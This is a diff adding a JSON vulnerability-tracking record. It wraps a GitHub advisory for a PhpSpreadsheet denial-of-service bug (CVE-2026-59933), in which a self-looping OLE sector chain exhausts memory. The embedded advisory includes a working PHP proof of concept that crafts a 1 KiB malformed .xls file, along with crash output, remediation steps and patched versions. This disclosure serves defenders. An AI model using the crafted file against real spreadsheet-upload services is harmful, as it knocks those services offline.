@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/87920408?v=4\", \"events_url\": \"https://api.github.com/users/sondt99/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sondt99/followers\", \"following_url\": \"https://api.github.com/users/sondt99/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sondt99/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sondt99\", \"id\": 87920408, \"login\": \"sondt99\", \"node_id\": \"MDQ6VXNlcjg3OTIwNDA4\", \"organizations_url\": \"https://api.github.com/users/sondt99/orgs\", \"received_events_url\": \"https://api.github.com/users/sondt99/received_events\", \"repos_url\": \"https://api.github.com/users/sondt99/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sondt99/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sondt99/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sondt99\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59933\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-835\", \"name\": \"Loop with Unreachable Exit Condition ('Infinite Loop')\"}], \"description\": \"## Summary\\n\\nPhpSpreadsheet's OLE reader follows sector chains from attacker-controlled XLS/OLE metadata without detecting cycles or enforcing a maximum chain length. A tiny malformed `.xls`/OLE file can set the small-block depot sector chain to point back to itself. During normal XLS detection, `OLERead::read()` appends the same sector data repeatedly until the PHP process exhausts memory.\\n\\nThis is reachable from `Reader\\\\Xls::canRead()` and therefore from automatic spreadsheet type detection. Applications that accept attacker-controlled spreadsheet uploads can suffer denial of service from a very small file.\\n\\n## Vulnerability details\\n\\n`OLERead::read()` loads the input and builds sector chains from attacker-controlled OLE header and allocation-table values:\\n\\n- `src/PhpSpreadsheet/Shared/OLERead.php:82` reads the entire file after validating only the OLE magic.\\n- `src/PhpSpreadsheet/Shared/OLERead.php:84-97` reads sector-chain metadata from the file header.\\n- `src/PhpSpreadsheet/Shared/OLERead.php:132-146` builds `bigBlockChain` and then follows the small-block depot chain.\\n\\nThe vulnerable loop is:\\n\\n```php\\n$sbdBlock = $this->sbdStartBlock;\\n$this->smallBlockChain = '';\\nwhile ($sbdBlock != -2) {\\n    $pos = ($sbdBlock + 1) * self::BIG_BLOCK_SIZE;\\n\\n    $this->smallBlockChain .= substr($this->data, $pos, 4 * $bbs);\\n    $pos += 4 * $bbs;\\n\\n    $sbdBlock = self::getInt4d($this->bigBlockChain, $sbdBlock * 4);\\n}\\n```\\n\\nThere is no visited-sector set, no maximum iteration count, no EOF bound, and no check that the next sector differs from a previously visited sector. If the allocation table maps sector `0` to sector `0`, the loop appends the same sector data forever until memory is exhausted.\\n\\nThe issue is reachable during normal reader detection/loading:\\n\\n- `src/PhpSpreadsheet/Reader/XlsBase.php:153-165` calls `OLERead::read()` from `canRead()`.\\n- `src/PhpSpreadsheet/Reader/Xls.php:376-383` calls `OLERead::read()` from `loadOLE()`.\\n- `src/PhpSpreadsheet/IOFactory.php:181-213` calls `canRead()` while creating a reader for a file, so automatic format detection can trigger the issue.\\n\\nSimilar unbounded sector-chain walks exist later in stream reading:\\n\\n- `src/PhpSpreadsheet/Shared/OLERead.php:175-180`\\n- `src/PhpSpreadsheet/Shared/OLERead.php:198-202`\\n- `src/PhpSpreadsheet/Shared/OLERead.php:218-222`\\n\\nThe proof of concept below confirms the small-block depot chain loop; the same remediation pattern should be applied to all sector-chain walks.\\n\\n## Impact\\n\\nA 1 KiB file can crash a PHP worker during `Xls::canRead()` or automatic file-type detection. This can deny service to web applications, queue workers, preview services, or document converters that process untrusted spreadsheet uploads.\\n\\nThe issue occurs before the file is recognized as a valid workbook stream, so even detection/probing paths are affected.\\n\\n## Safe local proof of concept\\n\\nThis proof of concept uses only Docker with `--network none`; it creates the malformed OLE file inside the container and does not contact external infrastructure.\\n\\n```bash\\ndocker run --rm --network none -i \\\\\\n  -v /home/sondt23/Github/CVE/ares/github-repo/PhpSpreadsheet:/app \\\\\\n  -w /app ghcr.io/typo3/core-testing-php82:1.15 sh <<'SH'\\nset -eu\\nphp -r '\\n$data = str_repeat(\\\"\\\\0\\\", 1024);\\n$set = function (int $off, string $bytes) use (&$data): void { $data = substr_replace($data, $bytes, $off, strlen($bytes)); };\\n$set(0, hex2bin(\\\"D0CF11E0A1B11AE1\\\"));\\n$set(28, \\\"\\\\xfe\\\\xff\\\");\\n$set(30, pack(\\\"v\\\", 9));     // sector size 512\\n$set(32, pack(\\\"v\\\", 6));     // mini sector size 64\\n$set(44, pack(\\\"l\\\", 1));     // 1 SAT sector\\n$set(48, pack(\\\"l\\\", 0));     // directory first sector 0\\n$set(56, pack(\\\"l\\\", 4096));  // mini stream cutoff\\n$set(60, pack(\\\"l\\\", 0));     // SSAT first sector 0\\n$set(64, pack(\\\"l\\\", 1));     // one SSAT sector\\n$set(68, pack(\\\"l\\\", -2));    // no MSAT extension\\n$set(72, pack(\\\"l\\\", 0));     // no extension sectors\\n$set(76, pack(\\\"l\\\", 0));     // DIFAT says SAT is sector 0\\n$set(512, pack(\\\"l\\\", 0));    // SAT entry for sector 0 points to itself\\nfile_put_contents(\\\"/tmp/phpspreadsheet-ole-selfloop.xls\\\", $data);\\nprintf(\\\"ole_size=%d\\\\n\\\", filesize(\\\"/tmp/phpspreadsheet-ole-selfloop.xls\\\"));\\n'\\nphp -d memory_limit=64M -d display_errors=1 -r '\\nrequire \\\"/app/vendor/autoload.php\\\";\\n$r = new PhpOffice\\\\PhpSpreadsheet\\\\Reader\\\\Xls();\\nvar_dump($r->canRead(\\\"/tmp/phpspreadsheet-ole-selfloop.xls\\\"));\\n' 2>&1 || true\\nSH\\n```\\n\\nObserved output:\\n\\n```text\\nole_size=1024\\nPHP Fatal error:  Allowed memory size of 67108864 bytes exhausted (tried to allocate 48234528 bytes) in /app/src/PhpSpreadsheet/Shared/OLERead.php on line 143\\nPHP Stack trace:\\nPHP   1. {main}() Command line code:0\\nPHP   2. PhpOffice\\\\PhpSpreadsheet\\\\Reader\\\\XlsBase->canRead($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') Command line code:4\\nPHP   3. PhpOffice\\\\PhpSpreadsheet\\\\Shared\\\\OLERead->read($filename = '/tmp/phpspreadsheet-ole-selfloop.xls') /app/src/PhpSpreadsheet/Reader/XlsBase.php:164\\n```\\n\\n## Suggested remediation\\n\\n- Validate every OLE sector-chain walk with:\\n  - a visited-sector set to reject cycles;\\n  - maximum chain length based on file size and sector size;\\n  - bounds checks before reading from `$this->data`, `$this->bigBlockChain`, or `$this->smallBlockChain`;\\n  - rejection of negative sector IDs other than the documented end-of-chain marker.\\n- Replace fatal memory exhaustion with a recoverable `Reader\\\\Exception` for malformed OLE chains.\\n- Apply the same guarded chain-walk helper to:\\n  - small-block depot chain construction;\\n  - small-block stream extraction;\\n  - big-block stream extraction;\\n  - `readData()`.\\n- Add regression tests with self-looping and out-of-range SAT/SSAT chains.\", \"ghsa_id\": \"GHSA-xh5m-36r6-47m3\", \"github_reviewed_at\": \"2026-07-23T15:01:50Z\", \"html_url\": \"https://github.com/advisories/GHSA-xh5m-36r6-47m3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xh5m-36r6-47m3\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59933\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-23T15:01:50Z\", \"references\": [\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-xh5m-36r6-47m3\", \"https://github.com/PHPOffice/PhpSpreadsheet/commit/85f2556b0bf5269061bf45932ecda8a128d81750\", \"https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/1.30.6\", \"https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.1.18\", \"https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.4.7\", \"https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/3.10.7\", \"https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/5.8.1\", \"https://github.com/advisories/GHSA-xh5m-36r6-47m3\"], \"repository_advisory_url\": \"https://api.github.com/repos/PHPOffice/PhpSpreadsheet/security-advisories/GHSA-xh5m-36r6-47m3\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/PHPOffice/PhpSpreadsheet\", \"summary\": \"PHPSpreadsheet: XLS/OLE sector-chain self-loop causes memory exhaustion\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-23T15:01:52Z\", \"url\": \"https://api.github.com/advisories/GHSA-xh5m-36r6-47m3\", \"vulnerabilities\": [{\"first_patched_version\": \"5.8.1\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 4.0.0, <= 5.8.0\"}, {\"first_patched_version\": \"3.10.7\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.3.0, <= 3.10.6\"}, {\"first_patched_version\": \"2.4.7\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.2.0, <= 2.4.6\"}, {\"first_patched_version\": \"2.1.18\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.0.0, <= 2.1.17\"}, {\"first_patched_version\": \"1.30.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpoffice/phpspreadsheet\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.30.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xh5m-36r6-47m3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phpoffice/phpspreadsheet: <= 1.30.5",
+      "phpoffice/phpspreadsheet: >= 2.0.0, <= 2.1.17",
+      "phpoffice/phpspreadsheet: >= 2.2.0, <= 2.4.6",
+      "phpoffice/phpspreadsheet: >= 3.3.0, <= 3.10.6",
+      "phpoffice/phpspreadsheet: >= 4.0.0, <= 5.8.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59933"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phpoffice/phpspreadsheet"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-23T19:37:32.512472Z",
+  "provenance": {
+    "content_sha256": "a4674e0b82a5db7437ce34929664d6d083246ae7f566b4405ea14fafdcf9db3f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-23T15:01:50Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xh5m-36r6-47m3",
+  "status": "active",
+  "title": "PHPSpreadsheet: XLS/OLE sector-chain self-loop causes memory exhaustion",
+  "updated_at": "2026-07-23T15:01:52Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xh5m-36r6-47m3"
+}
